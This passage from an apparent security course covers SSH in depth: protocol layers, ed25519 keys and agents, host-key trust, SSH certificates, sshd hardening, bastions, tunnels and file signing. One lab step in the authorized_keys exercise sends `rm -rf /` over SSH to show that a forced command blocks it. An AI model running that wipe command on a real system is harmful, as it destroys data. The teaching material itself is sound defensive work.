   what flag sets SNI?
2. How do you check whether a private key matches a certificate?
3. Which command probes whether a server still supports TLS 1.1?
4. On a testssl.sh report, name five things you check before calling a config
   sound.
5. testssl reports "vulnerable to BREACH" — is that a TLS fix? Why/why not?

### Further reading

- **Book (free):** *OpenSSL Cookbook*, Ristić — the `s_client` / `x509` / `verify`
  reference. Pair with Appendix B here.
- **Tool docs:** `testssl.sh` wiki, `sslyze` README, `nmap` ssl-enum-ciphers.
- **Site:** `badssl.com` (break-test your clients), `ssllabs.com/ssltest`,
  `hardenize.com`.
- **Cheat sheet:** "OpenSSL quick reference" posts abound; verify against the
  3.x man pages since flags changed from 1.1.
- **Man pages:** `openssl-s_client(1)`, `openssl-x509(1)`, `openssl-verify(1)`,
  `openssl-ocsp(1)`, `openssl-s_server(1)`.

---

### End of Part 7 — Milestone check

- [ ] I can state exactly what HTTPS guarantees and list what it does not
- [ ] I can explain why "the padlock" does not mean "safe"
- [ ] **I can draw the TLS 1.3 handshake from memory and say what each message
      proves**
- [ ] I know why TLS 1.3 always has forward secrecy and TLS 1.2 might not
- [ ] I can read a certificate and know which field does hostname matching
- [ ] I built a mini-CA and issued a working leaf certificate
- [ ] I can explain Certificate Transparency, and why revocation mostly doesn't
      work
- [ ] I can walk through an ACME issuance and I know what a CAA record does
- [ ] **I stood up a hardened local HTTPS + mTLS server and graded it**
- [ ] **I broke each TLS control and watched the tools catch it**
- [ ] I wrote the Part 7 TLS report

---

# Part 8 — SSH

SSH secures remote administration, file transfer, Git, tunnels, and
service-to-service access. It reuses everything from Parts 3–5 — AEAD, ECDHE,
signatures — with a different trust model from the web's PKI, and its own set of
sharp edges.

## Chapter 33 — What SSH is, and the connection protocol

### In one sentence

SSH is an encrypted, authenticated channel between two machines, built as three
stacked protocols — transport, user authentication, and multiplexed
connection — running over one TCP connection (default port 22).

### The problem it replaced

```
   Before SSH (mid-1990s): telnet, rlogin, rsh, rcp, ftp.

   telnet admin@server  ->  username and password sent in PLAINTEXT
   across the network. Every hop sees your root password. Session
   contents visible and injectable.

   SSH (1995, then the open OpenSSH in 1999) = "secure shell": the same
   remote-login workflow, inside strong crypto.
```

### The three layers

```
   +--------------------------------------------------------------+
   |  CONNECTION protocol  (RFC 4254)                              |
   |    multiplexes the single encrypted pipe into CHANNELS:       |
   |    interactive shell, exec, port-forwards (-L/-R/-D),         |
   |    X11, SFTP subsystem, agent-forwarding. Many at once.       |
   +--------------------------------------------------------------+
   |  USER AUTHENTICATION protocol  (RFC 4252)                     |
   |    proves WHO the client is: publickey, password,             |
   |    keyboard-interactive (2FA), hostbased, GSSAPI.             |
   +--------------------------------------------------------------+
   |  TRANSPORT protocol  (RFC 4253)                               |
   |    key exchange (ECDHE / PQ), SERVER authentication via its   |
   |    host key, then AEAD-encrypted, integrity-protected records.|
   |    Also: algorithm negotiation, rekeying.                     |
   +--------------------------------------------------------------+
                          over  TCP :22
```

Order matters: the **transport** layer builds the secure channel and
authenticates the **server** first; only then does the client authenticate the
**user** inside that channel. Your password or key proof is never sent in the
clear.

### The transport handshake

```
   CLIENT                                            SERVER
   ------                                            ------
   ---- TCP connect :22 ------------------------->
   <--- "SSH-2.0-OpenSSH_10.2" banner ------------>   (both send version strings)
   ---- KEXINIT: my kex / cipher / MAC / hostkey lists -->
   <--- KEXINIT: server's lists ------------------>   (each picks the first
                                                      mutually-supported option)

   ---- key exchange (default: mlkem768x25519-sha256 on OpenSSH 10,
        or sntrup761x25519 on 9.x; else curve25519-sha256) ------->
   <--- server's ephemeral KEX public value
        + SERVER HOST KEY (public)
        + SIGNATURE over the exchange hash with the host key ------

   *** both derive the shared secret -> keys. Channel now encrypted
       with chacha20-poly1305 or aes-256-gcm, integrity via the AEAD
       tag or an EtM HMAC. ***

   ---- (client verifies the host key against known_hosts -- Ch 34) --
   ---- USERAUTH begins, inside the encrypted channel --------------
```

Two things worth noting:

- **SSH used ephemeral DH for forward secrecy from the start** — years before TLS
  made it mandatory.
- **SSH already ships post-quantum key exchange by default.** OpenSSH 9.0 (2022)
  made `sntrup761x25519` a default; OpenSSH 10.0 (2025) made hybrid
  `mlkem768x25519-sha256` the top preference. If both ends are recent, your SSH
  is already HNDL-resistant (Chapter 23). Check with `ssh -Q kex`.

### User authentication methods

```
   publickey            client signs a challenge with its private key;
                        server checks against authorized_keys / a CA.
                        THE ONLY METHOD YOU SHOULD RELY ON.

   password             sent encrypted (not plaintext like telnet), but
                        brute-forceable, phishable, reused. Disable it on
                        anything internet-facing.

   keyboard-interactive generic prompt/response -> used for TOTP/OATH 2FA,
                        PAM. Combine with publickey for MFA.

   hostbased            the client HOST vouches for the user. Niche (HPC).

   gssapi-with-mic      Kerberos. Common in enterprise/AD environments.

   MFA in OpenSSH:  AuthenticationMethods publickey,keyboard-interactive
                    -> requires BOTH, in order.
```

### The channel multiplexing (why one SSH connection does so much)

```
   One TCP:22 connection, many logical channels:

     session   ->  your interactive shell  (or a single `ssh host cmd`)
     direct-tcpip   ->  ssh -L  local forward  (expose a remote service locally)
     forwarded-tcpip -> ssh -R  remote forward (expose a local service remotely)
     "dynamic" ->  ssh -D  SOCKS proxy (route arbitrary TCP through the host)
     x11       ->  forwarded GUI apps
     subsystem ->  sftp (file transfer over the same secure channel)
     auth-agent-> agent forwarding (Ch 34 -- convenient and risky)

   ControlMaster lets multiple `ssh` invocations to the same host SHARE
   one connection -> near-instant subsequent logins.
```

### Practice (25 min)

```bash
# 1. See the version banners and negotiated algorithms
ssh -vv localhost exit 2>&1 | grep -E "remote software version|kex:|cipher:|mac:|Server host key"

# 2. What key exchange / ciphers does your client offer?
ssh -Q kex
ssh -Q cipher
ssh -Q key
ssh -G localhost | grep -iE "^kexalgorithms|^ciphers|^macs"

# 3. Is PQ key exchange in the default list?
ssh -Q kex | grep -E "mlkem|sntrup"     # yes on OpenSSH 9+/10+

# 4. Watch the channel protocol: open a shell, a port-forward, and sftp
#    over ONE connection using multiplexing
mkdir -p ~/.ssh/cm
cat >> ~/.ssh/config <<'EOF'

Host localtest
    HostName localhost
    ControlMaster auto
    ControlPath ~/.ssh/cm/%r@%h:%p
    ControlPersist 60
EOF
ssh localtest true            # opens the master
ssh -O check localtest        # "Master running"
ssh localtest hostname        # reuses it -- instant
ssh -O exit localtest         # close it
```

### Common confusions

- **"SSH is just an encrypted terminal."** It's a general secure-tunnel protocol.
  Shells, file transfer, TCP forwarding, SOCKS proxying, and Git transport all
  ride it.
- **"The password is sent in plaintext like telnet."** No — it's inside the
  encrypted transport. It's still weak for *other* reasons (brute force,
  phishing, reuse).
- **"SSH needs a CA like HTTPS."** It doesn't require one. It defaults to
  trust-on-first-use for host keys and `authorized_keys` for users. SSH CAs exist
  and are great at scale (Chapter 35) but are opt-in.
- **"Port 22 open = insecure."** Exposure is a concern, but a key-only,
  MFA-enabled, modern OpenSSH on 22 is fine. Moving to a high port is obscurity,
  not security (though it cuts log noise).

### Check yourself

1. Name SSH's three sub-protocols and what each does.
2. Which is authenticated first in an SSH connection — the server or the user?
3. Which user-auth method should you rely on, and which should you disable on
   internet-facing hosts?
4. How does SSH already address "harvest now, decrypt later"?
5. What does `ssh -D` do, versus `ssh -L`?

*(Answers: Appendix F.)*

### Further reading

- **Book:** *SSH Mastery* (2nd ed.), Michael W. Lucas — short, practical, the
  standard recommendation.
- **RFCs:** 4251 (architecture), 4253 (transport), 4252 (auth), 4254
  (connection). Skim 4251 for the model.
- **Man pages:** `ssh(1)`, `sshd_config(5)`, `ssh_config(5)`, `ssh-keygen(1)` —
  you'll live in these.
- **Site:** `man.openbsd.org/ssh` and the OpenSSH release notes (each release's
  security and default changes are worth reading).

---

## Chapter 34 — Keys, agents, and host verification

### In one sentence

SSH authentication is signatures both ways: the server proves itself with its
**host key** (which you verify on first contact and pin), and you prove yourself
with your **user key** (whose public half sits in the server's
`authorized_keys`).

### Generating a user key — pick Ed25519

```bash
   ssh-keygen -t ed25519 -C "you@laptop-2026"
   # -> ~/.ssh/id_ed25519       (PRIVATE -- 0600, never leaves the machine)
   #    ~/.ssh/id_ed25519.pub   (PUBLIC  -- copy this around freely)
```

| Key type | Use it? | Notes |
|---|---|---|
| **ed25519** | **Yes — default choice** | small, fast, no parameter footguns (Ch 20) |
| **ecdsa** | Avoid for new keys | NIST curve; the ECDSA `k` footgun; no real upside over ed25519 |
| **rsa** (>=3072) | Only for old servers | works everywhere; large; ensure `rsa-sha2-256/512`, never `ssh-rsa` (SHA-1) |
| **ecdsa-sk / ed25519-sk** | **Yes, for humans** | `-sk` = backed by a FIDO2 hardware key (YubiKey, etc.); private key can't be exfiltrated |
| dsa | **Never** | removed from OpenSSH |

**Always set a passphrase** on the private key. It encrypts the key file at rest
(OpenSSH uses bcrypt-KDF + a stream cipher), so a stolen laptop doesn't equal a
stolen key. The agent (below) means you type it once per session.

### The SSH agent

```
   ssh-agent holds your DECRYPTED private keys in memory and does the
   signing on request, so you unlock once instead of per-connection.

     eval "$(ssh-agent -s)"          # start it (your desktop usually has one)
     ssh-add ~/.ssh/id_ed25519      # unlock and load (prompts for passphrase)
     ssh-add -l                      # list loaded keys
     ssh-add -t 8h ~/.ssh/id_ed25519  # auto-expire after 8 hours
     ssh-add -D                      # drop all keys now

   macOS: `ssh-add --apple-use-keychain` stores the passphrase in Keychain.
```

### Agent forwarding — convenient, and a real risk

```
   ssh -A jump-host       # forwards your agent socket to the remote

   Now from jump-host you can `ssh` onward without copying keys there.
   BUT: anyone with root on jump-host (or who compromises it) can use
   your forwarded agent to authenticate AS YOU to anything your keys
   open, for as long as you're connected. This is how attackers
   pivot through bastions.

   SAFER ALTERNATIVES:
     * ProxyJump (-J):   ssh -J jump-host target
       The jump host only forwards bytes; it never sees your agent or keys.
       Use this. It's the modern answer.
     * ssh-add -c :      require confirmation for each signing operation
     * per-host agent forwarding only where you truly need it, never by
       default, never to hosts you don't fully trust.
```

**Rule: `-J` (ProxyJump), not `-A` (agent forwarding), unless you have a specific
reason.**

### Host verification: trust on first use (TOFU)

The web has CAs vouch for server identity. Base SSH does not — it uses TOFU:

```
   FIRST connection to a host:

     The authenticity of host 'server (203.0.113.5)' can't be established.
     ED25519 key fingerprint is SHA256:D7hjS2f3jYzxkSBEqJULOG3wQDOQiUnR4KHh...
     Are you sure you want to continue connecting (yes/no)?

   If you type "yes", the host's public key is pinned in ~/.ssh/known_hosts.

   EVERY later connection: the presented host key is compared to the
   pinned one.
     * match   -> connect silently
     * MISMATCH -> big scary warning, connection REFUSED:
        "REMOTE HOST IDENTIFICATION HAS CHANGED!"  "POSSIBLE DNS SPOOFING"
       -> could be a reinstalled server... or a man-in-the-middle. Verify
          out of band before removing the old line.
```

**The weak moment is that first "yes".** If an attacker is in the path on your
very first connection, you pin *their* key. Mitigations:

```
   * Verify the fingerprint OUT OF BAND on first connect: cloud console,
     provisioning output, a colleague, config management.
   * Distribute known_hosts via config management (Ansible/Chef/MDM) so
     hosts are pre-trusted -- no human TOFU prompt at all.
   * Publish host keys in DNS with SSHFP records + DNSSEC, and set
     `VerifyHostKeyDNS yes`.
   * Use an SSH CA (Chapter 35): sign host keys, put ONE line
     (@cert-authority) in known_hosts, and TOFU disappears entirely.
```

### `authorized_keys` — how the server decides who's in

```
   ~/.ssh/authorized_keys on the server, one public key per line.
   Optional per-key RESTRICTIONS (use them):

     restrict,pty,command="/usr/bin/backup" ssh-ed25519 AAAA... backup-bot
     from="10.0.0.0/8",no-agent-forwarding ssh-ed25519 AAAA... alice
     no-port-forwarding,no-X11-forwarding,command="git-shell" ssh-ed25519 ...

   restrict = "deny everything, then add back only what I list". Start there.
   command="..." = force a single command regardless of what the client asks
                   -> the basis of locked-down deploy/backup/git accounts.
```

Manage this file with configuration management, not by hand. Deprovisioning a
person = remove their key from every host, so keep it centralised.

### Practice (35 min)

```bash
cd /tmp && rm -rf sshlab && mkdir sshlab && cd sshlab

# 1. Make two keys and inspect them
ssh-keygen -t ed25519 -f alice -N 'correct horse' -C alice@lab -q
ssh-keygen -t ed25519 -f bot   -N ''              -C deploy-bot -q
ssh-keygen -lf alice.pub                 # SHA256 fingerprint
ssh-keygen -lf alice.pub -E md5          # legacy MD5 form
ssh-keygen -lvf alice.pub                # + randomart (visual fingerprint)

# 2. See the encrypted-at-rest private key format
head -1 alice        # -----BEGIN OPENSSH PRIVATE KEY-----
ssh-keygen -y -f alice                    # derive .pub from private (needs passphrase)

# 3. Agent workflow
eval "$(ssh-agent -s)"
SSH_ASKPASS='' ssh-add alice              # will prompt for 'correct horse'
ssh-add -l
ssh-add -c bot                            # load with confirm-on-use
ssh-add -D                                # clear

# 4. TOFU + known_hosts, locally
#    (start a throwaway sshd on a high port -- or just use `localhost`)
ssh -o UserKnownHostsFile=./kh -o StrictHostKeyChecking=ask localhost true
cat ./kh                                  # the pinned host key line
#    now simulate a key change: edit one base64 char in ./kh, reconnect,
#    and watch the "IDENTIFICATION HAS CHANGED" refusal.

# 5. Restricted authorized_keys
printf 'restrict,command="echo locked-down; id" %s\n' "$(cat bot.pub)" \
  >> ~/.ssh/authorized_keys
ssh -i bot -o IdentitiesOnly=yes localhost "rm -rf /"   # runs the forced cmd, NOT rm
#    remove that line afterwards.
```

### Common confusions

- **"ecdsa is fine, it's a NIST standard."** For SSH user keys, prefer ed25519:
  no `k` footgun, smaller, faster, and it's OpenSSH's default.
- **"Agent forwarding (`-A`) is how you use a bastion."** No — that exposes your
  agent to the bastion. Use `ProxyJump` (`-J`). Reserve `-A` for trusted hosts
  where you truly need onward auth.
- **"The known_hosts warning is just noise from a rebuild."** Sometimes. But it's
  *exactly* what a MITM looks like. Verify out of band every time.
- **"A passphrase on the key slows me down."** The agent means one unlock per
  session. An unencrypted private key on disk is a credential anyone who reads
  the file now owns.
- **"authorized_keys is just a list of keys."** It's a policy file — `restrict`,
  `command=`, `from=` turn a shell account into a single-purpose, network-scoped
  robot.

### Check yourself

1. Which key type for a new SSH user key, and why not ECDSA?
2. What does the SSH agent do, and what does agent *forwarding* expose?
3. What should you use instead of `-A` to hop through a bastion?
4. Explain TOFU and where its trust weakness is. Name two ways to remove the
   first-connect prompt.
5. What does `restrict` do in `authorized_keys`, and what is `command=` for?

### Further reading

- **Article:** "SSH Agent Forwarding considered harmful" — Vincent Bernat's blog;
  and the OpenSSH docs on `ProxyJump`.
- **Guide:** Mozilla OpenSSH guidelines (`infosec.mozilla.org/guidelines/openssh`)
  — concrete `ssh_config` / `sshd_config` hardening.
- **Docs:** `ssh-keygen(1)` (the `-sk` FIDO2 section), `ssh-add(1)` (`-c`, `-t`).
- **Video:** "SSH keys, agents, and certificates" talks from BSDCan / LISA;
  smallstep's SSH blog series.
- **Tool:** `ssh-audit` (`github.com/jtesta/ssh-audit`) — grades your client and
  server config.

---

## Chapter 35 — SSH certificates, hardening, and bastions

### In one sentence

At more than a handful of hosts, replace `known_hosts` and `authorized_keys`
sprawl with a small **SSH CA** that issues short-lived certificates, and put all
access behind a hardened bastion.

### Why `authorized_keys` doesn't scale

```
   50 engineers x 500 servers = up to 25,000 authorized_keys entries to
   keep in sync. When someone leaves, you must scrub their key from all
   500. When a host is rebuilt, every client re-TOFUs. Stale keys linger
   for years. This is a real, common source of breaches.
```

### SSH certificates

An SSH certificate is a public key plus metadata (principals, validity window,
options), **signed by a CA key**. It works for **both** directions:

```
   HOST CERTIFICATES  -- kills TOFU
     * Generate a CA keypair. Keep the CA private key offline / in an HSM /
       in a signing service.
     * Sign each server's host key -> host certificate with principal =
       the hostname(s).
     * Clients get ONE line in known_hosts:
         @cert-authority *.securesh.op ssh-ed25519 AAAA...<CA pubkey>
     * Now any host presenting a valid cert for its name is trusted.
       No prompts, no per-host pinning, rebuilds are painless.

   USER CERTIFICATES  -- kills authorized_keys sprawl
     * User authenticates to an identity provider (SSO/OIDC + MFA).
     * A signing service issues a SHORT-LIVED cert (e.g. 1-24 h) binding
       their key to principals (usernames/roles) they're entitled to.
     * Servers trust the CA:
         # /etc/ssh/sshd_config
         TrustedUserCAKeys /etc/ssh/user_ca.pub
     * No per-user keys on servers. Deprovisioning = stop issuing certs;
       access expires by itself within hours.
```

```bash
   # Issue a user cert valid 8h, principals alice+deployers, with restrictions
   ssh-keygen -s user_ca -I "alice@2026-09-10" \
     -n alice,deployers -V +8h \
     -O clear -O permit-pty -O permit-port-forwarding \
     -O source-address=10.0.0.0/8 \
     alice_ed25519.pub
   # -> alice_ed25519-cert.pub   (ssh presents it automatically alongside the key)

   ssh-keygen -Lf alice_ed25519-cert.pub    # inspect: principals, validity, options
```

**Force expiry (`-V`) is the point.** Short-lived certs make revocation a
non-problem: a leaked cert dies on its own in hours. (There's also a
`RevokedKeys` / KRL mechanism for the rare urgent case.)

Tools that do all this for you: **HashiCorp Vault SSH secrets engine**,
**smallstep `step-ca`**, **Teleport**, **Netflix BLESS**, **Cloudflare Access /
GCP OS Login** for the managed path.

### Hardening `sshd_config`

A solid baseline (adapt paths; test with `sshd -t` before reload):

```
   # --- authentication ---
   PermitRootLogin no                    # or prohibit-password if you must
   PasswordAuthentication no
   KbdInteractiveAuthentication no       # unless you use it for TOTP MFA
   PubkeyAuthentication yes
   AuthenticationMethods publickey       # add ,keyboard-interactive for MFA
   MaxAuthTries 3
   LoginGraceTime 20
   AllowGroups ssh-users                 # allowlist, not everyone

   # --- trust anchors ---
   TrustedUserCAKeys /etc/ssh/user_ca.pub
   HostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub
   HostKey /etc/ssh/ssh_host_ed25519_key

   # --- reduce attack surface ---
   AllowTcpForwarding no                 # yes only on bastions that need it
   AllowAgentForwarding no
   X11Forwarding no
   PermitTunnel no
   PermitUserEnvironment no
   AllowStreamLocalForwarding no

   # --- modern crypto only (OpenSSH 9+/10+) ---
   KexAlgorithms mlkem768x25519-sha256,sntrup761x25519-sha512@openssh.com,curve25519-sha256
   Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
   MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
   HostKeyAlgorithms ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-256
   PubkeyAcceptedAlgorithms ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-256

   # --- logging / containment ---
   LogLevel VERBOSE                      # logs key fingerprints used to auth
   Banner none
   ClientAliveInterval 300
   ClientAliveCountMax 2
   # Match blocks for per-group restriction, chroot for SFTP-only users, etc.
```

Then: `ssh-audit localhost` and fix whatever it flags.

### The bastion (jump host) pattern

```
                            internet
                               |
                        +------------+          hardened, minimal, heavily
                        |  BASTION   |          logged, MFA, no forwarding
                        | (public)   |          except what's needed, its
                        +------------+          own audited sshd
                               |  (private network only)
              +----------------+----------------+
              |                |                |
          app-01           app-02            db-01     (sshd listens on the
        no public IP     no public IP     no public IP   private interface only)

   Client:   ssh -J bastion.securesh.op app-01.internal
             (ProxyJump: bastion forwards TCP; never sees your keys/agent)

   Even better: bastion + user certificates + session recording
     -> every session is authenticated to a real identity, time-boxed,
        and replayable for audit. This is what Teleport / Vault / Boundary
        / AWS SSM Session Manager give you.
```

Modern alternative: **agent-based / identity-aware access** (AWS SSM Session
Manager, GCP IAP, Tailscale SSH, Cloudflare Access) removes the public SSH port
entirely — the host dials out or a control plane brokers the session.

### Practice / mini-project (75 min): SecureShop SSH CA

```
   Build the whole thing locally with containers or VMs:

   1. CA: ssh-keygen -t ed25519 -f user_ca -C "SecureShop User CA"
          ssh-keygen -t ed25519 -f host_ca -C "SecureShop Host CA"
          (in reality user_ca lives in Vault/step-ca/an HSM)

   2. HOST side: on each "server", sign its host key with host_ca
          ssh-keygen -s host_ca -I app-01 -h -n app-01.securesh.op -V +52w \
              /etc/ssh/ssh_host_ed25519_key.pub
      Configure sshd: HostCertificate ..., TrustedUserCAKeys /etc/ssh/user_ca.pub

   3. CLIENT side: one line in known_hosts:
          @cert-authority *.securesh.op <contents of host_ca.pub>
      Connect -> NO TOFU prompt. Rebuild a host, re-sign -> still no prompt.

   4. USER side: write `ssh-issue <user> <principals>` that signs the
      user's key with user_ca, -V +8h, with source-address + permit-pty
      only. Connect with the cert.

   5. Prove the properties:
      - a user cert past its -V window is rejected (set -V +1m, wait).
      - a principal you weren't granted is refused by the server's
        AuthorizedPrincipalsFile / Match.
      - revoke a cert via a KRL (ssh-keygen -k) and confirm refusal.
      - `ssh -J bastion app-01` works; `ssh -A` is refused by config.

   6. Write it up in ~/sec-lab/reports/part8-ssh.md.
```

### Common confusions

- **"SSH certs are X.509 certs."** Different, simpler format
  (`...-cert-v01@openssh.com`). No chains, no DER, no CAs-of-CAs. One CA signs
  leaves.
- **"We need OCSP/CRL for SSH."** Prefer short `-V` lifetimes; use a KRL only for
  urgent revocation. Expiry is the strategy, same as modern TLS.
- **"The bastion needs my agent forwarded."** Use `ProxyJump`. The bastion should
  never be able to act as you.
- **"Disable TCP forwarding everywhere."** Yes on app servers; the *bastion* often
  needs `AllowTcpForwarding yes` to do its job — scope it per host/group.
- **"Changing the port hardens SSH."** It reduces scan noise. Key-only auth, MFA,
  modern crypto, and a bastion are the actual hardening.

### Check yourself

1. Why does `authorized_keys` + `known_hosts` fail to scale, and what replaces
   each?
2. What single line in `known_hosts` eliminates TOFU for a whole domain?
3. Why do short certificate lifetimes make SSH revocation a near-non-issue?
4. Give five `sshd_config` settings from the hardening baseline and what each
   prevents.
5. What does `ssh -J` do that `ssh -A` does not (security-wise)?

### Further reading

- **Docs:** `ssh-keygen(1)` "CERTIFICATES" section — the authoritative reference.
- **Guide:** Facebook Engineering, "Scalable and secure access with SSH"
  (the certificates write-up) and Netflix's BLESS.
- **Tools:** HashiCorp Vault SSH secrets engine docs; smallstep
  `step-ca` SSH tutorial; Teleport architecture docs.
- **Hardening:** Mozilla OpenSSH guidelines; `ssh-audit`; CIS Benchmark for
  OpenSSH.
- **Book:** *SSH Mastery* (2nd ed.), Lucas — certificate and tunneling chapters.

---

## Chapter 36 — Hands-on: SSH keys, tunnels, config, and signing

### Why this chapter exists

SSH is a daily tool. Fluency with `~/.ssh/config`, port forwarding, and
`ssh-keygen -Y` signing pays off constantly. This is the drill.

### `~/.ssh/config` — stop typing flags

```
   # Global-ish defaults
   Host *
       AddKeysToAgent yes
       IdentitiesOnly yes                 # only offer the key I name (avoids
                                          # "too many auth failures" lockouts)
       ServerAliveInterval 60
       HashKnownHosts yes
       ControlMaster auto
       ControlPath ~/.ssh/cm/%r@%h:%p
       ControlPersist 5m

   Host bastion
       HostName bastion.securesh.op
       User jump
       IdentityFile ~/.ssh/id_ed25519

   Host app-* db-*
       User deploy
       IdentityFile ~/.ssh/id_ed25519_work
       ProxyJump bastion                  # <-- transparently hop via bastion
       RequestTTY auto

   Host github.com
       User git
       IdentityFile ~/.ssh/id_ed25519_github
       IdentitiesOnly yes

   # Then just:  ssh app-01.internal   (user, key, and jump are automatic)
```

### Port forwarding — the three kinds

```
   LOCAL forward   ssh -L 5433:db.internal:5432 bastion
     "expose the remote db's :5432 on my localhost:5433"
     -> psql -h 127.0.0.1 -p 5433 ... reaches db.internal through the tunnel.

   REMOTE forward  ssh -R 8080:localhost:3000 jump
     "expose MY localhost:3000 on the remote host's :8080"
     -> for demos, webhooks to a laptop. (GatewayPorts on the server
        controls whether :8080 is public or loopback-only there.)

   DYNAMIC forward ssh -D 1080 bastion
     "run a SOCKS5 proxy on localhost:1080 that exits via bastion"
     -> point a browser / curl --socks5 at it to reach an internal network.

   Add  -N  (no shell)  and  -f  (background) for tunnel-only sessions.
   Jump without forwarding anything:  ssh -J bastion target
```

### `scp` / `sftp` / `rsync` over SSH

```bash
   # scp's syntax is legacy and footgun-prone; on OpenSSH 9+ it uses the
   # SFTP protocol under the hood. Prefer sftp or rsync for real work.
   sftp app-01.internal          # interactive: get/put/ls/lcd
   rsync -avz --delete ./site/ app-01.internal:/var/www/site/   # uses ssh
   rsync -e 'ssh -J bastion' ...  # rsync through a jump host
```

### SSH message signing with `ssh-keygen -Y` (no GPG needed)

Since OpenSSH 8.0 you can sign *arbitrary files* with an SSH key — this is what
Git uses for `gpg.format ssh`.

```bash
cd /tmp && mkdir -p ysign && cd ysign
ssh-keygen -t ed25519 -f signer -N '' -C release@securesh.op -q

# SIGN  (namespace scopes the signature's meaning; use "file" for files,
#        "git" is what git uses)
echo "SecureShop release 7.0.0" > NOTES
ssh-keygen -Y sign -f signer -n file NOTES          # -> NOTES.sig

# VERIFY needs an allowed-signers file mapping identity -> public key
printf '%s %s\n' release@securesh.op "$(cat signer.pub)" > allowed_signers
ssh-keygen -Y verify -f allowed_signers -I release@securesh.op \
           -n file -s NOTES.sig < NOTES             # -> "Good file signature..."

# tamper -> fails
echo tampered >> NOTES
ssh-keygen -Y verify -f allowed_signers -I release@securesh.op \
           -n file -s NOTES.sig < NOTES             # -> "Signature verification failed"
```

```bash
   # Git signed commits with your SSH key (no GPG):
   git config --global gpg.format ssh
   git config --global user.signingkey ~/.ssh/id_ed25519.pub
   git config --global commit.gpgsign true
   # verification needs an allowed_signers file:
   git config --global gpg.ssh.allowedSignersFile ~/.ssh/allowed_signers
   #   ~/.ssh/allowed_signers:  you@example.com ssh-ed25519 AAAA...
   git commit -S -m "signed"        # then: git log --show-signature
```

### Debugging SSH

```bash
   ssh -v host        # one -v: auth method negotiation
   ssh -vv host       # + kex/cipher/mac, key offering
   ssh -vvv host      # packet-level

   # Common failures and the -v line that reveals them:
   #  "Permission denied (publickey)"  -> "Offering public key ..." then
   #     "Authentications that can continue" -> server didn't accept the key:
   #     wrong key, not in authorized_keys, bad perms (must be 700 ~/.ssh,
   #     600 the key, 644 .pub, 600 authorized_keys, and the HOME not
   #     group-writable -- sshd is strict).
   #  "too many authentication failures" -> agent offered many keys;
   #     set IdentitiesOnly yes + IdentityFile.
   #  "REMOTE HOST IDENTIFICATION HAS CHANGED" -> known_hosts mismatch (Ch 34).
   #  "no matching key exchange method" -> old server, modern client (or
   #     vice versa); check `ssh -Q kex` on both, add a KexAlgorithms line.

   sudo sshd -T            # dump the server's EFFECTIVE config
   sudo sshd -t            # validate config before reload (do this ALWAYS)
   journalctl -u ssh -f    # watch auth attempts (LogLevel VERBOSE helps)
```

### Practice / drill (45 min)

Do these without looking back:

1. Write a `~/.ssh/config` with a `bastion` host and an `app-*` pattern that
   uses `ProxyJump bastion`, a specific `IdentityFile`, and `IdentitiesOnly`.
2. Generate an `ed25519-sk` key (if you have a FIDO2 key) or a passphrase-
   protected `ed25519` key. Load it into the agent with an 8-hour timeout.
3. Open a **local** forward from your `localhost:15432` to a remote Postgres,
   through the bastion, tunnel-only (`-N -f`). Tear it down cleanly.
4. Open a **dynamic** (SOCKS) proxy and use `curl --socks5-hostname` through it.
5. Sign a file with `ssh-keygen -Y sign`, verify it with an `allowed_signers`
   file, tamper with the file, watch verification fail.
6. Configure Git to sign commits with your SSH key; make a signed commit; run
   `git log --show-signature`.
7. Deliberately break `~/.ssh` permissions (`chmod 777 ~/.ssh`) and read the
   exact `ssh -v` error. Restore.

### Common confusions

- **"`ssh-copy-id` then it works everywhere."** It appends to *one* host's
  `authorized_keys`. At scale, use config management or an SSH CA.
- **"`-L` and `-R` — I'll remember which is which."** `-L` = **L**ocal port that
  I connect to; `-R` = port on the **R**emote that others connect to. Mixing them
  up exposes the wrong service.
- **"scp is fine."** Its quoting/globbing is a known footgun; OpenSSH itself
  recommends `sftp`/`rsync`. On 9+, `scp` speaks SFTP anyway.
- **"Signing needs GPG."** `ssh-keygen -Y` and Git's `gpg.format ssh` sign with
  the SSH key you already have.
- **"Permission denied means wrong password."** For `publickey` it usually means
  key not accepted or **file permissions too open** — `sshd` refuses
  group/world-readable keys and writable HOME.

### Check yourself

1. What do `ProxyJump`, `IdentitiesOnly`, and `ControlMaster` each do in
   `ssh_config`?
2. Explain `-L`, `-R`, and `-D` forwards with one concrete use each.
3. How do you sign and verify an arbitrary file with an SSH key, and what is the
   `-n` namespace for?
4. `ssh -v` shows the key being offered then "Permission denied (publickey)" —
   name three causes.
5. Which command validates `sshd_config` before you reload it?

### Further reading

- **Man pages:** `ssh_config(5)` (every `Host` option), `ssh-keygen(1)` (`-Y`
  section), `scp(1)` note recommending sftp/rsync.
- **Book:** *SSH Mastery* (2nd ed.), Lucas — config and tunneling chapters.
- **Docs:** Git `gpg.format ssh` documentation; GitHub's "SSH commit signature
  verification" guide.
- **Cheat sheet:** `explainshell.com` for any `ssh -L ...` line; the Arch/Debian
  wiki SSH pages.
- **Tool:** `sshuttle` (VPN-over-SSH), `mosh` (roaming SSH), `assh`/`storm`
  (config managers), `ssh-audit`.

---

### End of Part 8 — Milestone check

- [ ] I can name SSH's three sub-protocols and the order authentication happens
- [ ] I know why SSH already resists "harvest now, decrypt later"
- [ ] I use ed25519 keys with a passphrase and an agent
- [ ] **I understand why `ProxyJump` beats agent forwarding, and use `-J`**
- [ ] I can explain TOFU, its weak point, and how an SSH CA removes it
- [ ] I can write a hardened `sshd_config` from memory (top 5 settings)
- [ ] **I built an SSH CA that issues short-lived host and user certificates**
- [ ] I can set up `-L` / `-R` / `-D` forwards and a `~/.ssh/config` with
      `ProxyJump`
- [ ] **I signed and verified a file with `ssh-keygen -Y` and signed a Git
      commit with my SSH key**
- [ ] I wrote the Part 8 SSH report

---

# Part 9 — Network security

TLS and SSH secure individual connections. This Part is about the network they
run on: how an attacker who controls a hop sniffs, spoofs, and redirects
traffic — and how DNS security, segmentation, firewalls, and VPNs contain that.

## Chapter 37 — The network attacker: sniffing, spoofing, MITM

### In one sentence

A network attacker's power depends on their **position** — passively on the path,
actively on the path, or off the path having to spoof their way in — and every
defence in this Part is about shrinking what each position buys them.

